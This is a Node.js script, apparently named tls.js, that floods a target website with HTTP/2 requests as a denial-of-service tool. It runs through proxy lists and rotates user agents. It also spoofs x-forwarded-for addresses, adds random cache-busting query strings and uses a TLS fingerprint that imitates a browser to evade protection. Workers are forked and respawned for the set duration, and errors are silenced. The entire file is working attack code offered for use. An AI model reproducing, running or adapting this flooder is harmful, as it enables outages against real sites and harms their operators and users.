const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://site.com 60 100 5`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:" +
                 "rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE;

const secureProtocol = "TLS_client_method";
const secureContext = tls.createSecureContext({
    ciphers,
    sigalgs,
    honorCipherOrder: true,
    secureOptions,
    secureProtocol
});

const proxies = readLines("proxy.txt").filter(Boolean);
const userAgents = readLines("ua.txt").filter(Boolean);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5]
};

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) cluster.fork();
    cluster.on("exit", () => cluster.fork());
} else {
    startFlooding();
}

function readLines(path) {
    return fs.readFileSync(path, "utf-8").toString().split(/\r?\n/);
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomIP() {
    return `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 255)}`;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function startFlooding() {
    const flood = () => {
        for (let i = 0; i < args.rate; i++) runFlooder();
    };
    setInterval(flood, 1000);
}

class NetSocket {
    HTTP(options, callback) {
        const req = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const socket = net.connect({ host: options.host, port: options.port });

        socket.setTimeout(options.timeout * 1000);
        socket.setKeepAlive(true);
        socket.setNoDelay(true);

        socket.on("connect", () => socket.write(req));
        socket.on("data", chunk => {
            if (chunk.toString().includes("200")) callback(socket, null);
            else {
                socket.destroy();
                callback(null, "bad proxy");
            }
        });
        socket.on("timeout", () => { socket.destroy(); callback(null, "timeout"); });
        socket.on("error", () => { socket.destroy(); callback(null, "conn error"); });
    }
}

const SocketHandler = new NetSocket();

function runFlooder() {
    const proxy = randomElement(proxies);
    const [host, port] = proxy.split(":");

    const proxyOptions = {
        host,
        port: ~~port,
        address: parsedTarget.host,
        timeout: 10
    };

    const headers = {
        ":method": "GET",
        ":path": parsedTarget.path + `?v=${Math.random().toString(36).substring(7)}`,
        ":scheme": "https",
        ":authority": parsedTarget.host,
        "user-agent": randomElement(userAgents),
        "x-forwarded-for": randomIP(),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache",
        "referer": `https://${parsedTarget.host}${parsedTarget.path}`,
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "upgrade-insecure-requests": "1"
    };

    SocketHandler.HTTP(proxyOptions, (connection, err) => {
        if (err || !connection) return;

        const tlsConn = tls.connect({
            host: parsedTarget.host,
            port: 443,
            servername: parsedTarget.host,
            secureContext,
            rejectUnauthorized: false,
            socket: connection,
            ALPNProtocols: ["h2"],
            ciphers,
            sigalgs,
            ecdhCurve,
            secureOptions,
            secureProtocol
        });

        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true);

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                enablePush: false,
                initialWindowSize: 6291456
            }
        });

        client.on("connect", () => {
            for (let i = 0; i < 2; i++) {
                const req = client.request(headers);
                req.on("response", () => req.close());
                req.end();
            }
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
